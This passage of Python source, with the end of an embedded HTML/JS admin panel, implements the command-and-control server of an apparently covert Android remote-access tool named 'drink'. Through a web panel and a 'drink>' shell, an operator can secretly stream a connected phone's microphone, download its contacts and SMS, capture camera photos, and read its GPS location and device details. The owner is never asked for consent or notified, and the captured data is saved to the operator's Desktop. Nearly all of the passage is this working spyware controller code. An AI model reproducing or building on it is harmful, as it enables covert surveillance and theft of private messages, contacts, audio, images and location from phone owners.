    document.getElementById('telStorageBar').style.width = pct + '%';
  }

  if (tData.memory) {
    const m = tData.memory;
    const totalGb = (m.total_bytes / (1024 * 1024 * 1024)).toFixed(1);
    const usedGb = (m.used_bytes / (1024 * 1024 * 1024)).toFixed(1);
    const freeGb = (m.free_bytes / (1024 * 1024 * 1024)).toFixed(1);
    const pct = m.total_bytes > 0 ? Math.round((m.used_bytes / m.total_bytes) * 100) : 0;
    document.getElementById('telRamText').textContent = `${usedGb} GB / ${totalGb} GB (${pct}%) — ${freeGb} GB ${t('free')}`;
    document.getElementById('telRamBar').style.width = pct + '%';
  }

  if (tData.device) {
    const d = tData.device;
    document.getElementById('telModel').textContent = d.model ? `${d.manufacturer || ''} ${d.model}`.trim() : '--';
    document.getElementById('telManufacturer').textContent = d.manufacturer || '--';
    document.getElementById('telAndroidVer').textContent = d.android_version ? `Android ${d.android_version} (API ${d.sdk || '?'})` : '--';
    document.getElementById('telSecurityPatch').textContent = d.security_patch || '--';

    if (d.uptime_seconds !== undefined) {
      const sec = d.uptime_seconds;
      const days = Math.floor(sec / 86400);
      const hrs = Math.floor((sec % 86400) / 3600);
      const mins = Math.floor((sec % 3600) / 60);
      const upStr = currentLang === 'fa' ?
        `${days} روز، ${hrs} ساعت، ${mins} دقیقه` :
        `${days}d ${hrs}h ${mins}m`;
      document.getElementById('telUptime').textContent = upStr;
    }
  }

  if (tData.location && tData.location.latitude && tData.location.longitude) {
    const loc = tData.location;
    document.getElementById('telNoGpsMsg').style.display = 'none';
    document.getElementById('telMapBox').style.display = 'block';
    document.getElementById('telLocInfoRow').style.display = 'flex';
    document.getElementById('telLocLinks').style.display = 'flex';

    document.getElementById('telLat').textContent = Number(loc.latitude).toFixed(6);
    document.getElementById('telLon').textContent = Number(loc.longitude).toFixed(6);
    document.getElementById('telAccuracy').textContent = loc.accuracy ? `±${Math.round(loc.accuracy)}m` : '--';
    document.getElementById('telAltitude').textContent = loc.altitude ? `${Math.round(loc.altitude)}m` : '--';

    document.getElementById('linkGmaps').href = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
    document.getElementById('linkOsm').href = `https://www.openstreetmap.org/?mlat=${loc.latitude}&mlon=${loc.longitude}#map=16/${loc.latitude}/${loc.longitude}`;

    if (window.L) {
      if (!telMap) {
        telMap = L.map('telMapBox').setView([loc.latitude, loc.longitude], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          maxZoom: 19,
          attribution: '© OpenStreetMap'
        }).addTo(telMap);
        telMarker = L.marker([loc.latitude, loc.longitude]).addTo(telMap);
        if (loc.accuracy) {
          telCircle = L.circle([loc.latitude, loc.longitude], { radius: loc.accuracy, color: '#0071e3', fillOpacity: 0.15 }).addTo(telMap);
        }
      } else {
        telMap.setView([loc.latitude, loc.longitude], 15);
        if (telMarker) telMarker.setLatLng([loc.latitude, loc.longitude]);
        if (telCircle) {
          telCircle.setLatLng([loc.latitude, loc.longitude]);
          if (loc.accuracy) telCircle.setRadius(loc.accuracy);
        }
      }
      setTimeout(() => { if (telMap) telMap.invalidateSize(); }, 200);
    }
  } else {
    document.getElementById('telNoGpsMsg').style.display = 'block';
    document.getElementById('telMapBox').style.display = 'none';
    document.getElementById('telLocLinks').style.display = 'none';
  }
}

function exportTelemetryJson() {
  if (!window.latestTelemetryData) {
    alert(currentLang === 'fa' ? 'اطلاعات تله‌متری وجود ندارد' : 'No telemetry data to export');
    return;
  }
  const str = JSON.stringify(window.latestTelemetryData, null, 2);
  const blob = new Blob([str], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `drink_telemetry_${Date.now()}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function copyCoords() {
  const lat = document.getElementById('telLat').textContent;
  const lon = document.getElementById('telLon').textContent;
  navigator.clipboard.writeText(`${lat}, ${lon}`);
}

async function refreshLogs() {
  const lines = await api('/api/logs');
  if (lines) {
    const consoleBox = document.getElementById('logConsole');
    consoleBox.textContent = lines.join('\\n');
    consoleBox.scrollTop = consoleBox.scrollHeight;
  }
}

function clearLogs() {
  document.getElementById('logConsole').textContent = '';
}

initLanguage();
initTheme();
checkAuth();
renderCamPills(['0', '1']);
setInterval(() => {
  if (sessionStorage.getItem('drink_authenticated') === 'true') {
    refreshStatus();
  }
}, 1500);
setInterval(() => {
  if (sessionStorage.getItem('drink_authenticated') === 'true') {
    refreshLogs();
  }
}, 2000);
if (sessionStorage.getItem('drink_authenticated') === 'true') {
  refreshStatus();
  refreshLogs();
  loadContactsList();
  initCardAudioContext();
}
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_ADMIN_PAGE


@app.get("/mic", response_class=HTMLResponse)
async def mic_page():
    return HTML_MIC_PAGE


@app.websocket("/ws/audio")
async def ws_audio(websocket: WebSocket):
    await websocket.accept()
    audio_clients.add(websocket)
    try:
        while True:
            await websocket.receive_bytes()
    except WebSocketDisconnect:
        pass
    finally:
        audio_clients.discard(websocket)


async def broadcast_audio(chunk: bytes):
    dead = set()
    for ws in audio_clients:
        try:
            await ws.send_bytes(chunk)
        except Exception:
            dead.add(ws)
    audio_clients.difference_update(dead)


async def send_frame(writer: asyncio.StreamWriter, payload: bytes):
    header = struct.pack(">I", len(payload))
    writer.write(header + payload)
    await writer.drain()


async def recv_frame(reader: asyncio.StreamReader) -> bytes:
    raw_len = await reader.readexactly(4)
    length = struct.unpack(">I", raw_len)[0]
    return await reader.readexactly(length)


async def send_command(cmd: dict):
    writer = state["client_writer"]
    if writer is None:
        print("no client connected")
        return
    await send_frame(writer, json.dumps(cmd).encode())


def client_connected() -> bool:
    return state["client_writer"] is not None


def clear_client():
    state["client_reader"] = None
    state["client_writer"] = None
    state["client_addr"] = None
    state["mic_active"] = False


async def handle_mic_stream(reader: asyncio.StreamReader):
    state["mic_active"] = True
    log_event("mic stream started — open http://localhost:3000/mic to listen")
    print("\n[mic] streaming started — open http://localhost:3000/mic to listen")
    print("drink> ", end="", flush=True)
    try:
        while state["mic_active"] and state["client_writer"] is not None:
            try:
                header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=5.0)
            except asyncio.TimeoutError:
                continue
            header = json.loads(header_bytes.decode())
            if header.get("type") != "mic_chunk":
                break
            audio_data = await recv_frame(reader)
            await broadcast_audio(audio_data)
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    except Exception as e:
        log_event(f"mic stream error: {e}")
    finally:
        state["mic_active"] = False
        log_event("mic stream ended")
        print("\n[mic] stream ended")
        print("drink> ", end="", flush=True)


async def handle_contacts(reader: asyncio.StreamReader) -> Optional[str]:
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"contacts error from client: {msg}")
            print(f"[contacts] error from client: {msg}")
            return None
        if header.get("type") != "contacts":
            log_event(f"contacts unexpected response: {header.get('type')}")
            print(f"[contacts] unexpected response type: {header.get('type')}")
            return None
        data = await recv_frame(reader)
        dest = Path.home() / "Desktop" / "contacts.zip"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        state["latest_contacts"] = dest
        state["latest_contacts_bytes"] = data
        try:
            zf = zipfile.ZipFile(io.BytesIO(data))
            with zf.open("contacts.json") as f:
                state["contacts_list"] = json.loads(f.read().decode("utf-8"))
        except Exception:
            pass
        log_event(f"contacts saved {len(data)} bytes to {dest}")
        print(f"[contacts] saved {len(data)} bytes → {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"contacts error: {e}")
        print(f"[contacts] error: {e}")
        return None


async def handle_sms(reader: asyncio.StreamReader, requested_hours: int):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"sms error from client: {msg}")
            print(f"[sms] error from client: {msg}")
            return []
        if header.get("type") != "sms":
            log_event(f"sms unexpected response: {header.get('type')}")
            print(f"[sms] unexpected response type: {header.get('type')}")
            return []
        messages = header.get("data", [])
        actual_hours = header.get("hours", requested_hours)
        state["latest_sms"] = messages
        log_event(f"sms received {len(messages)} messages (last {actual_hours}h)")
        print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
        for msg in messages:
            addr = msg.get("address", "?")
            body = msg.get("body", "")
            ts = msg.get("date", "")
            direction = "▼" if msg.get("type") == 1 else "▲"
            print(f"  {direction} [{ts}] {addr}: {body}")
        if not messages:
            print("  (none)")
        return messages
    except Exception as e:
        log_event(f"sms error: {e}")
        print(f"[sms] error: {e}")
        return []


async def handle_list_cams(reader: asyncio.StreamReader):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=10.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"camera list error: {msg}")
            print(f"[cameras] error from client: {msg}")
            return []
        if header.get("type") != "cams":
            log_event(f"cameras unexpected response: {header.get('type')}")
            print(f"[cameras] unexpected response: {header.get('type')}")
            return []
        cams = header.get("data", [])
        state["cameras"] = cams
        log_event(f"detected cameras: {cams}")
        for cam in cams:
            print(cam)
        return cams
    except Exception as e:
        log_event(f"camera list error: {e}")
        print(f"[cameras] error: {e}")
        return []


async def handle_camera_capture(reader: asyncio.StreamReader, cam_id: str):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"camera {cam_id} error: {msg}")
            print(f"[cam {cam_id}] error from client: {msg}")
            return None
        if header.get("type") != "camera_capture":
            log_event(f"camera unexpected response: {header.get('type')}")
            print(f"[cam {cam_id}] unexpected response: {header.get('type')}")
            return None
        data = await recv_frame(reader)
        ts = int(time.time())
        dest = Path.home() / "Desktop" / f"cam_{cam_id}_{ts}.jpg"
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        state["latest_photo"] = dest
        state["latest_photo_bytes"] = data
        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest}")
        print(f"[cam {cam_id}] saved {len(data)} bytes → {dest}")
        return str(dest)
    except Exception as e:
        log_event(f"camera capture error: {e}")
        print(f"[cam {cam_id}] error: {e}")
        return None


async def handle_telemetry(reader: asyncio.StreamReader):
    try:
        header_bytes = await asyncio.wait_for(recv_frame(reader), timeout=15.0)
        header = json.loads(header_bytes.decode())
        if header.get("type") == "error":
            msg = header.get("message", "unknown error")
            log_event(f"telemetry error from client: {msg}")
            print(f"[telemetry] error from client: {msg}")
            return None
        if header.get("type") != "telemetry":
            log_event(f"telemetry unexpected response: {header.get('type')}")
            print(f"[telemetry] unexpected response type: {header.get('type')}")
            return None
        state["latest_telemetry"] = header
        log_event("telemetry updated from device")
        print("[telemetry] updated from device")
        return header
    except Exception as e:
        log_event(f"telemetry error: {e}")
        print(f"[telemetry] error: {e}")
        return None


async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    addr = writer.get_extra_info("peername")
    state["client_reader"] = reader
    state["client_writer"] = writer
    state["client_addr"] = addr
    log_event(f"client connected from {addr}")
    print(f"\n[+] client connected from {addr}")
    print("drink> ", end="", flush=True)
    try:
        await asyncio.Event().wait()
    except Exception:
        pass


async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    if client_connected():
        writer.close()
        await writer.wait_closed()
        return
    await client_session(reader, writer)


async def start_tcp_server_action():
    if state["listening"]:
        print("already listening")
        return {"status": "already_listening"}
    server = await asyncio.start_server(tcp_client_handler, TCP_HOST, TCP_PORT)
    state["tcp_server"] = server
    state["listening"] = True
    log_event(f"TCP server listening on {TCP_HOST}:{TCP_PORT}")
    print(f"[*] listening on {TCP_HOST}:{TCP_PORT}")
    return {"status": "started", "host": TCP_HOST, "port": TCP_PORT}


async def stop_tcp_server_action():
    if not state["listening"]:
        print("not listening")
        return {"status": "not_listening"}
    server = state["tcp_server"]
    if server:
        server.close()
        await server.wait_closed()
        state["tcp_server"] = None
        state["listening"] = False
    if state["client_writer"]:
        try:
            state["client_writer"].close()
            await state["client_writer"].wait_closed()
        except Exception:
            pass
        clear_client()
    log_event("TCP server stopped")
    print("[*] TCP server stopped")
    return {"status": "stopped"}


async def cmd_disconnect():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    await send_command({"cmd": "disconnect"})
    if state["client_writer"]:
        try:
            state["client_writer"].close()
            await state["client_writer"].wait_closed()
        except Exception:
            pass
    clear_client()
    log_event("client disconnected")
    print("[*] client disconnected")
    return {"status": "disconnected"}


async def cmd_use_mic():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    if state["mic_active"]:
        print("mic already active")
        return {"status": "already_active"}
    await send_command({"cmd": "use_mic"})
    reader = state["client_reader"]
    loop.create_task(handle_mic_stream(reader))
    return {"status": "started"}


async def cmd_get_contacts():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client"}
    await send_command({"cmd": "get_contacts"})
    reader = state["client_reader"]
    dest = await handle_contacts(reader)
    return {"status": "ok" if dest else "failed", "path": dest}


async def cmd_get_sms(hours: int = 24):
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": []}
    await send_command({"cmd": "get_sms", "hours": hours})
    reader = state["client_reader"]
    messages = await handle_sms(reader, hours)
    return {"status": "ok", "data": messages}


async def cmd_list_cams():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": []}
    await send_command({"cmd": "list_cams"})
    reader = state["client_reader"]
    cams = await handle_list_cams(reader)
    return {"status": "ok", "data": cams}


async def cmd_use_cam(cam_id: str):
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "path": None}
    await send_command({"cmd": "use_cam", "cam_id": str(cam_id)})
    reader = state["client_reader"]
    dest = await handle_camera_capture(reader, str(cam_id))
    return {"status": "ok" if dest else "failed", "path": dest}


async def cmd_get_telemetry():
    if not client_connected():
        print("no client connected")
        return {"status": "no_client", "data": None}
    await send_command({"cmd": "get_telemetry"})
    reader = state["client_reader"]
    data = await handle_telemetry(reader)
    return {"status": "ok" if data else "failed", "data": data}


@app.get("/api/status")
async def api_status():
    return {
        "listening": state["listening"],
        "client_connected": client_connected(),
        "client_addr": f"{state['client_addr'][0]}:{state['client_addr'][1]}" if state["client_addr"] else None,
        "mic_active": state["mic_active"],
        "tcp_host": TCP_HOST,
        "tcp_port": TCP_PORT,
        "cameras": state["cameras"],
        "has_photo": state["latest_photo_bytes"] is not None,
        "has_contacts": state["latest_contacts_bytes"] is not None,
        "sms_count": len(state["latest_sms"]),
        "contacts_count": len(state["contacts_list"]),
        "has_telemetry": state["latest_telemetry"] is not None,
        "telemetry": state["latest_telemetry"],
    }


@app.get("/api/logs")
async def api_logs():
    return list(logs)


@app.post("/api/server/start")
async def api_server_start():
    fut = asyncio.run_coroutine_threadsafe(start_tcp_server_action(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/server/stop")
async def api_server_stop():
    fut = asyncio.run_coroutine_threadsafe(stop_tcp_server_action(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/server/kill")
async def api_server_kill():
    def kill_soon():
        time.sleep(0.5)
        os._exit(0)
    threading.Thread(target=kill_soon, daemon=True).start()
    return {"status": "killing"}


@app.post("/api/client/disconnect")
async def api_client_disconnect():
    fut = asyncio.run_coroutine_threadsafe(cmd_disconnect(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/mic/start")
async def api_mic_start():
    fut = asyncio.run_coroutine_threadsafe(cmd_use_mic(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/mic/stop")
async def api_mic_stop():
    state["mic_active"] = False
    return {"status": "stopped"}


@app.post("/api/client/contacts")
async def api_client_contacts():
    fut = asyncio.run_coroutine_threadsafe(cmd_get_contacts(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/sms")
async def api_client_sms(payload: dict = None):
    hours = 24
    if payload and "hours" in payload:
        try:
            hours = int(payload["hours"])
        except Exception:
            hours = 24
    fut = asyncio.run_coroutine_threadsafe(cmd_get_sms(hours), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.get("/api/sms/latest")
async def api_sms_latest():
    return state["latest_sms"]


@app.get("/api/sms/download")
async def api_sms_download():
    content = json.dumps(state["latest_sms"], indent=2, ensure_ascii=False).encode("utf-8")
    return Response(
        content=content,
        media_type="application/json",
        headers={"Content-Disposition": "attachment; filename=sms_messages.json"},
    )


@app.post("/api/client/cameras")
async def api_client_cameras():
    fut = asyncio.run_coroutine_threadsafe(cmd_list_cams(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/camera/capture")
async def api_client_camera_capture(payload: dict = None):
    cam_id = "0"
    if payload and "cam_id" in payload:
        cam_id = str(payload["cam_id"])
    fut = asyncio.run_coroutine_threadsafe(cmd_use_cam(cam_id), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.post("/api/client/telemetry")
async def api_client_telemetry():
    fut = asyncio.run_coroutine_threadsafe(cmd_get_telemetry(), loop)
    res = await asyncio.wrap_future(fut)
    return res


@app.get("/api/client/telemetry")
async def api_client_telemetry_get():
    return state["latest_telemetry"] or {}


@app.get("/api/photo/latest")
async def api_photo_latest():
    if state["latest_photo_bytes"]:
        return Response(content=state["latest_photo_bytes"], media_type="image/jpeg")
    return Response(content=b"", status_code=404)


@app.get("/api/contacts/download")
async def api_contacts_download():
    if state["latest_contacts_bytes"]:
        return Response(
            content=state["latest_contacts_bytes"],
            media_type="application/zip",
            headers={"Content-Disposition": "attachment; filename=contacts.zip"},
        )
    return Response(content=b"", status_code=404)


@app.get("/api/contacts/list")
async def api_contacts_list():
    if state["contacts_list"]:
        return {"status": "ok", "count": len(state["contacts_list"]), "contacts": state["contacts_list"]}
    if state["latest_contacts_bytes"]:
        try:
            zf = zipfile.ZipFile(io.BytesIO(state["latest_contacts_bytes"]))
            with zf.open("contacts.json") as f:
                data = json.loads(f.read().decode("utf-8"))
                state["contacts_list"] = data
                return {"status": "ok", "count": len(data), "contacts": data}
        except Exception as e:
            return {"status": "error", "message": str(e), "contacts": []}
    dest = Path.home() / "Desktop" / "contacts.zip"
    if dest.exists():
        try:
            with zipfile.ZipFile(dest) as zf:
                with zf.open("contacts.json") as f:
                    data = json.loads(f.read().decode("utf-8"))
                    state["contacts_list"] = data
                    return {"status": "ok", "count": len(data), "contacts": data}
        except Exception as e:
            return {"status": "error", "message": str(e), "contacts": []}
    return {"status": "none", "count": 0, "contacts": []}


def print_help(post_start: bool = False, post_connect: bool = False):
    if not post_start:
        print("  start            start listening for TCP connections")
        print("  quit             exit")
        return
    if not post_connect:
        print("  stop             stop listening")
        print("  quit             exit")
        print("  (waiting for client…)")
        return
    print("  disconnect       disconnect the Android client")
    print("  use mic          start mic audio stream")
    print("  get contacts     download contacts.zip to Desktop")
    print("  get sms [hours]  fetch SMS messages (default 24h)")
    print("  get telemetry    fetch device battery, network, storage, and specs")
    print("  list             list available cameras")
    print("  use cam <id>     capture photo from camera (e.g. use cam 0)")
    print("  stop             stop server and disconnect client")
    print("  quit             exit")
    print("  help             show this help")


async def shell_loop():
    executor_loop = asyncio.get_event_loop()

    def read_line():
        sys.stdout.write("drink> ")
        sys.stdout.flush()
        return sys.stdin.readline()

    while True:
        line = await executor_loop.run_in_executor(None, read_line)
        line = line.strip()
        if not line:
            continue

        cmd = line.lstrip("/").strip()

        if cmd in ("quit", "exit"):
            print("bye.")
            os._exit(0)

        if cmd == "start":
            if state["listening"]:
                print("already listening")
            else:
                executor_loop.create_task(start_tcp_server_action())
            continue

        if cmd == "stop":
            if not state["listening"]:
                print("not listening")
            else:
                await stop_tcp_server_action()
            continue

        if cmd == "disconnect":
            await cmd_disconnect()
            continue

        if cmd == "use mic":
            await cmd_use_mic()
            continue

        if cmd == "get contacts":
            await cmd_get_contacts()
            continue

        if cmd == "get sms" or cmd.startswith("get sms "):
            parts = cmd.split()
            hours = 24
            if len(parts) >= 3 and parts[2].isdigit():
                hours = int(parts[2])
            await cmd_get_sms(hours)
            continue

        if cmd == "list" or cmd == "list cams" or cmd == "list cameras":
            await cmd_list_cams()
            continue

        if cmd.startswith("use cam"):
            parts = cmd.split()
            cam_id = parts[2] if len(parts) >= 3 else "0"
            await cmd_use_cam(cam_id)
            continue

        if cmd in ("get telemetry", "telemetry"):
            await cmd_get_telemetry()
            continue

        if cmd == "help":
            print_help(state["listening"], client_connected())
            continue

        print(f"unknown command: {line!r}  (type help)")


def start_uvicorn():
    config = uvicorn.Config(app, host="0.0.0.0", port=WEB_PORT, log_level="warning")
    server = uvicorn.Server(config)
    server.run()


async def main():
    global loop
    loop = asyncio.get_event_loop()

    web_thread = threading.Thread(target=start_uvicorn, daemon=True)
    web_thread.start()

    print(f"drink server — web UI at http://localhost:{WEB_PORT}")
    print("type help for commands")

    await shell_loop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nbye.")
